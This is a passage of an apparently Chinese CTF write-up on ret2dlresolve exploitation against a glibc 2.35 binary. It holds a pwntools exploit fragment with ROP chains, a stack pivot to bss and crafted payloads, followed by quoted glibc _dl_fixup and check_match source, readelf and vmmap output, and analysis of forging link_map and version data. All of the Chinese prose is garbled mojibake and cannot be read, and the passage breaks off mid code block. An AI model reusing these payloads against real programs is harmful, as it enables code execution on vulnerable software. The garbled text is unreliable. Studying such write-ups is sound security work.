ˆä¸º_dl_runtime_resolve(&lt;-rsp)=&gt;link_map=&gt;0 å¹¶ä¸”æ­¤æ—¶ripä¸ºret</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, pop_rdi, <span class="number">0</span>, pop_rsi_r15, bss, <span class="number">0</span>, read_plt, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">r.sendline(flat(<span class="number">0x601028</span>, gadget_for_read, <span class="number">0x600EC0</span> + <span class="number">0x8</span>))</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, gadget_csu, <span class="number">0</span>, <span class="number">1</span>, bss + <span class="number">8</span>,</span><br><span class="line">               <span class="number">503</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0x4007C0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>*<span class="number">7</span>, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># é€šè¿‡æ ˆè¿ç§»ï¼Œé¡ºåˆ©æ‰§è¡Œdl-runtime-resolve</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>, <span class="number">0x601fc8</span>, pop_rdi, bss+<span class="number">0x100</span>+<span class="number">0x50</span>, <span class="number">0x400772</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(r, <span class="string">&#x27;directory ./glibc-2.35/elf&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="é‡ç‚¹ï¼šä¸Partialåˆ©ç”¨æ–¹å¼çš„åŒºåˆ«"><a href="#é‡ç‚¹ï¼šä¸Partialåˆ©ç”¨æ–¹å¼çš„åŒºåˆ«" class="headerlink" title="é‡ç‚¹ï¼šä¸Partialåˆ©ç”¨æ–¹å¼çš„åŒºåˆ«"></a>é‡ç‚¹ï¼šä¸Partialåˆ©ç”¨æ–¹å¼çš„åŒºåˆ«</h2><h3 id="Partialåˆ©ç”¨æ–¹å¼é‡è°ˆ"><a href="#Partialåˆ©ç”¨æ–¹å¼é‡è°ˆ" class="headerlink" title="Partialåˆ©ç”¨æ–¹å¼é‡è°ˆ"></a>Partialåˆ©ç”¨æ–¹å¼é‡è°ˆ</h3><p><strong>( åœ¨ä¸‹é¢è®¨è®ºè€ç‰ˆæœ¬æ—¶ï¼Œé»˜è®¤åªå­˜åœ¨æ ˆæº¢å‡ºï¼Œä¸å­˜åœ¨ä¸Šè¿°é¢˜ç›®ä¸­çš„gadget )</strong></p><p>åœ¨ä»¥å‰çš„æ–‡ç« ï¼Œåœ¨64ä½çš„partialä¿æŠ¤ä¸­æˆ‘å†™çš„éå¸¸ç²—ç³™ï¼Œæ‰€ä»¥åœ¨è¿™é‡Œä¹Ÿè¶æ­¤æœºä¼šè¯¦ç»†è°ˆä¸€ä¸‹ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">DL_FIXUP_VALUE_TYPE</span><br><span class="line">attribute_hidden __attribute ((noinline)) DL_ARCH_FIXUP_ATTRIBUTE</span><br><span class="line">_dl_fixup (</span><br><span class="line"><span class="meta"># <span class="meta-keyword">ifdef</span> ELF_MACHINE_RUNTIME_FIXUP_ARGS</span></span><br><span class="line">   ELF_MACHINE_RUNTIME_FIXUP_ARGS,</span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line">   struct link_map *l, ElfW(Word) reloc_arg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *<span class="keyword">const</span> symtab</span></span><br><span class="line"><span class="function">    </span>= (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *strtab = (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_STRTAB]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">uintptr_t</span> pltgot = (<span class="keyword">uintptr_t</span>) D_PTR (l, l_info[DT_PLTGOT]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> PLTREL *<span class="keyword">const</span> reloc</span><br><span class="line">    = (<span class="keyword">const</span> <span class="keyword">void</span> *) (D_PTR (l, l_info[DT_JMPREL])</span><br><span class="line">      + reloc_offset (pltgot, reloc_arg));</span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym </span>= &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *refsym </span>= sym;</span><br><span class="line">  <span class="keyword">void</span> *<span class="keyword">const</span> rel_addr = (<span class="keyword">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);</span><br><span class="line">  <span class="keyword">lookup_t</span> result;</span><br><span class="line">  DL_FIXUP_VALUE_TYPE value;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Sanity check that we&#x27;re really looking at a PLT relocation.  */</span></span><br><span class="line">  assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* Look up the target symbol.  If the normal lookup rules are not</span></span><br><span class="line"><span class="comment">      used don&#x27;t look in the global scope.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">version</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Half)</span> *vernum </span>=</span><br><span class="line">    (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">  version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">  <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">    version = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We need to keep the scope around so do some locking.  This is</span></span><br><span class="line"><span class="comment"> not necessary for objects which cannot be unloaded or when</span></span><br><span class="line"><span class="comment"> we are not using any threads (yet).  */</span></span><br><span class="line">      <span class="keyword">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;</span><br><span class="line">      <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">&#123;</span><br><span class="line">  THREAD_GSCOPE_SET_FLAG ();</span><br><span class="line">  flags |= DL_LOOKUP_GSCOPE_LOCK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> RTLD_ENABLE_FOREIGN_CALL</span></span><br><span class="line">      RTLD_ENABLE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,</span><br><span class="line">    version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We are done with the global scope.  */</span></span><br><span class="line">      <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">THREAD_GSCOPE_RESET_FLAG ();</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> RTLD_FINALIZE_FOREIGN_CALL</span></span><br><span class="line">      RTLD_FINALIZE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Currently result contains the base load address (or link map)</span></span><br><span class="line"><span class="comment"> of the object that defines sym.  Now add in the symbol</span></span><br><span class="line"><span class="comment"> offset.  */</span></span><br><span class="line">      value = DL_FIXUP_MAKE_VALUE (result,</span><br><span class="line">   SYMBOL_ADDRESS (result, sym, <span class="literal">false</span>));</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* We already found the symbol.  The module (and therefore its load</span></span><br><span class="line"><span class="comment"> address) is also known.  */</span></span><br><span class="line">      value = DL_FIXUP_MAKE_VALUE (l, SYMBOL_ADDRESS (l, sym, <span class="literal">true</span>));</span><br><span class="line">      result = l;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  ... ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆåˆ™æ˜¯å…³äº<code>_dl_fixup</code>å‡½æ•°çš„é‡æ–°åˆ†æï¼Œé€šè¿‡å­—ç¬¦ä¸²è¿›è¡ŒæŸ¥æ‰¾å¯¹åº”å‡½æ•°æ—¶æˆ‘ä»¬éœ€è¦è¿›å…¥åˆ°åº•è¿™æ¡ifè¯­å¥</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>è€Œæœ€ç»ˆçœŸæ­£æ‰¾åˆ°å‡½æ•°åœ°å€çš„å‡½æ•°å…¶å®æ˜¯<code>_dl_lookup_symbol_x</code>å‡½æ•°ã€‚ç„¶è€Œå…¶ä¸­å­˜åœ¨ä¸€æ¡è°ƒç”¨å…³ç³»æ˜¯<code>do_lookup_x</code>=&gt;<code>check_match</code>ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *</span></span><br><span class="line"><span class="function"><span class="title">check_match</span> <span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *<span class="keyword">const</span> undef_name,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">const</span> ElfW(Sym) *<span class="keyword">const</span> ref,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">const</span> struct r_found_version *<span class="keyword">const</span> version,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">const</span> <span class="keyword">int</span> flags,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">const</span> <span class="keyword">int</span> type_class,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">const</span> ElfW(Sym) *<span class="keyword">const</span> sym,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">const</span> Elf_Symndx symidx,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">const</span> <span class="keyword">char</span> *<span class="keyword">const</span> strtab,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">const</span> struct link_map *<span class="keyword">const</span> <span class="built_in">map</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">const</span> ElfW(Sym) **<span class="keyword">const</span> versioned_sym,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">int</span> *<span class="keyword">const</span> num_versions)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> stt = ELFW(ST_TYPE) (sym-&gt;st_info);</span><br><span class="line">  assert (ELF_RTYPE_CLASS_PLT == <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely ((sym-&gt;st_value == <span class="number">0</span> <span class="comment">/* No value.  */</span></span><br><span class="line"> &amp;&amp; sym-&gt;st_shndx != SHN_ABS</span><br><span class="line"> &amp;&amp; stt != STT_TLS)</span><br><span class="line">|| elf_machine_sym_no_match (sym)</span><br><span class="line">|| (type_class &amp; (sym-&gt;st_shndx == SHN_UNDEF))))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Ignore all but STT_NOTYPE, STT_OBJECT, STT_FUNC,</span></span><br><span class="line"><span class="comment">     STT_COMMON, STT_TLS, and STT_GNU_IFUNC since these are no</span></span><br><span class="line"><span class="comment">     code/data definitions.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ALLOWED_STT \</span></span><br><span class="line"><span class="meta">  ((1 &lt;&lt; STT_NOTYPE) | (1 &lt;&lt; STT_OBJECT) | (1 &lt;&lt; STT_FUNC) \</span></span><br><span class="line"><span class="meta">   | (1 &lt;&lt; STT_COMMON) | (1 &lt;&lt; STT_TLS) | (1 &lt;&lt; STT_GNU_IFUNC))</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (((<span class="number">1</span> &lt;&lt; stt) &amp; ALLOWED_STT) == <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (sym != ref &amp;&amp; <span class="built_in">strcmp</span> (strtab + sym-&gt;st_name, undef_name))</span><br><span class="line">    <span class="comment">/* Not the symbol we are looking for.  */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Half)</span> *verstab </span>= <span class="built_in">map</span>-&gt;l_versyms;</span><br><span class="line">  <span class="keyword">if</span> (version != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (verstab == <span class="literal">NULL</span>))</span><br><span class="line">&#123;</span><br><span class="line">  assert (version-&gt;filename == <span class="literal">NULL</span></span><br><span class="line">  || ! _dl_name_match_p (version-&gt;filename, <span class="built_in">map</span>));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Otherwise we accept the symbol.  */</span></span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* We can match the version information or use the</span></span><br><span class="line"><span class="comment">     default one if it is not hidden.  */</span></span><br><span class="line">  ElfW(Half) ndx = verstab[symidx] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">  <span class="keyword">if</span> ((<span class="built_in">map</span>-&gt;l_versions[ndx].hash != version-&gt;hash</span><br><span class="line">       || <span class="built_in">strcmp</span> (<span class="built_in">map</span>-&gt;l_versions[ndx].name, version-&gt;name))</span><br><span class="line">      &amp;&amp; (version-&gt;hidden || <span class="built_in">map</span>-&gt;l_versions[ndx].hash</span><br><span class="line">  || (verstab[symidx] &amp; <span class="number">0x8000</span>)))</span><br><span class="line">    <span class="comment">/* It&#x27;s not the version we want.  */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (verstab != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ((verstab[symidx] &amp; <span class="number">0x7fff</span>)</span><br><span class="line">      &gt;= ((flags &amp; DL_LOOKUP_RETURN_NEWEST) ? <span class="number">2</span> : <span class="number">3</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Don&#x27;t accept hidden symbols.  */</span></span><br><span class="line">      <span class="keyword">if</span> ((verstab[symidx] &amp; <span class="number">0x8000</span>) == <span class="number">0</span></span><br><span class="line">  &amp;&amp; (*num_versions)++ == <span class="number">0</span>)</span><br><span class="line"><span class="comment">/* No version so far.  */</span></span><br><span class="line">*versioned_sym = sym;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* There cannot be another entry for this symbol so stop here.  */</span></span><br><span class="line">  <span class="keyword">return</span> sym;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€Œåœ¨<code>check_match</code>å‡½æ•°ä¸­é€šè¿‡è¿™æ¡<code>if (version != NULL)</code>è¯­å¥åˆåˆ†ä¸ºäº†ä¸¤æ¡åˆ†æ”¯ï¼Œè‚‰çœ¼å¯è§çš„æ˜¯ä¸Šé¢çš„åˆ†æ”¯æ˜¯è¾ƒä¸ºä¸¥æ ¼çš„ä¸€æ¡ï¼Œè€Œä¸‹é¢çš„åˆ™æ˜¯è¾ƒä¸ºç®€å•çš„ä¸€æ¡ã€‚ä¸è¿‡æ˜¾è€Œæ˜“è§çš„æ˜¯è¿™æ¡åˆ†æ”¯çš„èµ°å‘æ˜¯ç”±<code>version</code>å˜é‡å†³å®šçš„ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Half)</span> *vernum </span>=</span><br><span class="line">    (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">  version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">  <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">    version = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€Œ<code>version</code>çš„ç”±æ¥å°±æ˜¯ä¸Šé¢çš„è¿™æ®µä»£ç èµ‹äºˆçš„ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬å¯ä»¥æ§åˆ¶</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">l-&gt;l_info[VERSYMIDX (DT_VERSYM)] == <span class="literal">NULL</span></span><br></pre></td></tr></table></figure><p>æˆ–è€…å¯ä»¥æ§åˆ¶<code>ndx</code>éƒ½æ˜¯å¯ä»¥è§£å†³çš„ã€‚</p><p>é¦–å…ˆæ€è€ƒç¬¬äºŒç§æ–¹å¼ï¼Œé¦–å…ˆåˆ™æ˜¯å¯ä»¥çœ‹åˆ°è¿™é‡Œ<code>ndx</code>ä¸­çš„è®¡ç®—æ–¹å¼<code>ELFW(R_SYM) (reloc-&gt;r_info)</code>å’Œå‰é¢è·å–<code>sym</code>æ—¶æ˜¯åŒä¸€ç§è¿ç®—æ–¹å¼ã€‚æ‰€ä»¥è¿™ä¸€ç®—å¼ä¸­çš„å„ä¸ªå‚æ•°æˆ‘ä»¬æ˜¯ä¼˜å…ˆä¿è¯symçš„æ­£ç¡®æ€§çš„ã€‚ä¸è¿‡<code>DT_SYMTAB</code>æ‰€å¤„çš„æ®µå’Œ<code>DT_VERSYM</code>æ‰€å¤„çš„æ®µæ˜¯ä¸ä¸€æ ·çš„ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘ä»¬èƒ½å¤Ÿä¿®æ”¹è¿™é‡Œçš„ä¾æ®ä¹‹ä¸€ï¼Œå¦ä¸€ä¸ªä¾æ®åˆ™æ˜¯<code>&amp;l-&gt;l_versions[0]</code>çš„å†…å®¹æ˜¯NULLã€‚æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦è®©ä»–ä¸ºNULLå³å¯ã€‚</p><p><code>DT_VERSYM</code>èŠ‚çš„ä½ç½®å…¶å®å°±æ˜¯<code>.gnu.version</code>èŠ‚çš„ä½ç½®ï¼Œæ‰€ä»¥é¦–å…ˆé€šè¿‡<code>readelf</code>æŸ¥çœ‹ä¸€ä¸‹èŠ‚çš„ä½ç½®</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Version symbols section <span class="string">&#x27;.gnu.version&#x27;</span> contains 7 entries:</span><br><span class="line">Addr: 0x00000000004003dc  Offset: 0x0003dc  Link: 5 (.dynsym)</span><br><span class="line">000:   0 (*<span class="built_in">local</span>*)       0 (*<span class="built_in">local</span>*)       2 (GLIBC_2.2.5)   2 (GLIBC_2.2.5)</span><br><span class="line">004:   3 (GLIBC_2.7)     2 (GLIBC_2.2.5)   2 (GLIBC_2.2.5)</span><br></pre></td></tr></table></figure><p>éšåçœ‹ä¸€ä¸‹ç¨‹åºåœ¨è¿è¡Œæ—¶çš„å†…å­˜å¸ƒå±€</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">        0x400000           0x401000 r-xp     1000 0      /ctf/work/download/todo/ezzzz</span><br><span class="line">        0x600000           0x601000 r--p     1000 0      /ctf/work/download/todo/ezzzz</span><br><span class="line">        0x601000           0x602000 rw-p     1000 1000   /ctf/work/download/todo/ezzzz</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°<code>DT_VERSYM</code>æ‰€å¤„çš„ä½ç½®å°±æ˜¯ç¬¬ä¸€é¡µä¸­ã€‚</p><p>è€Œåœ¨linuxå­˜åœ¨è¿™æ ·ä¸€ç§åˆ†é¡µæœºåˆ¶ï¼Œå¦‚æœå½“å‰é¡µçš„ä½¿ç”¨ä¸åˆ°<code>0x1000</code>å…¶å®ä¹Ÿä¼šè¿”å›ä¸€é¡µï¼Œæ‰€ä»¥åœ¨æ²¡æœ‰ä½¿ç”¨å®Œçš„æƒ…å†µä¸‹ï¼Œé¡µå†…å¯èƒ½å­˜åœ¨ç©ºç™½æ•°æ®ä¹Ÿå°±æ˜¯<code>\x00</code>ã€‚è€Œè¿™ä¸ªæ®µçš„ç»“æŸä½ç½®åˆ™åœ¨<code>.eh_frame</code>å¯ä»¥çœ‹åˆ°åœ°å€ä¸º<code>0000000000400860</code>ï¼Œé‚£ä¹ˆå½“è¿™ä¸ªç»“æŸåœ°å€å‡å»<code>.gnu.version</code>çš„åœ°å€åˆ™è¡¨ç¤ºæ‰€å–çš„<code>ndx</code>çš„åç§»åˆ°<code>0x400860 ~ 0x401000</code>ä¹‹é—´åˆ°æœ€å°å€¼ã€‚</p><p>åœ¨x64å’Œx32ä¸Š<code>ElfW(Half)</code>çš„ç»“æ„éƒ½æ˜¯2ä¸ªå­—èŠ‚ã€‚æ‰€ä»¥ä¸Šè¿°çš„æœ€å°åç§»æ˜¯ï¼š<code>(0x400860-0x4003dc) / sizeof(ElfW(Half)) = 0x242</code></p><p>è€Œæˆ‘ä»¬éœ€è¦æŠŠä¼ªé€ çš„å†…å®¹æ”¾åˆ°bssæ®µä¸Šï¼Œéšåè®¡ç®—æœ€å¤§åç§»åˆ™æ˜¯æ ¹æ®symçš„è·å–è¿›è¡Œè®¡ç®—<code>(0x602000-0x601000) /sizeof (Elf64_Sym) = 0xaa</code>ã€‚æœ€ç»ˆå¾—åˆ°<code>0xaa &lt; 0x242</code>æ‰€ä»¥ä¹Ÿå°±å¯¼è‡´æ— æ³•åœ¨æ»¡è¶³ndxçš„åŒæ—¶æ‹¿åˆ°ä¼ªé€ çš„symç»“æ„ã€‚**(ä¸è¿‡32ä½æ˜¯å¯ä»¥çš„ï¼Œåªéœ€è¦åœ¨bssé åçš„ä½ç½®å†™symç»“æ„ä½“å³å¯)**ã€‚</p><p>é‚£ä¹ˆæ¥ç€æ€è€ƒç¬¬ä¸€ç§æ–¹å¼ï¼Œåœ¨åªæœ‰æ ˆæº¢å‡ºçš„æƒ…å†µä¸‹æˆ‘ä»¬æ— æ³•ç›´æ¥æ³„æ¼æˆ–ä¿®æ”¹<code>link_map</code>ç»“æ„ä½“ä¸­çš„å†…å®¹ï¼Œé‚£ä¹ˆå”¯ä¸€å¯è¡Œçš„æ–¹æ³•å°±æ˜¯è¿›è¡Œæ ˆè¿ç§»åœ¨bssä¸­ä¼ªé€ <code>link_map</code>ï¼Œä½†æ˜¯å¦‚æœæ˜¯èµ°ç¬¬ä¸€ä¸ªåˆ†æ”¯å°±ä¼šå‡ºç°ä¸€ç§æƒ…å†µäº†ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 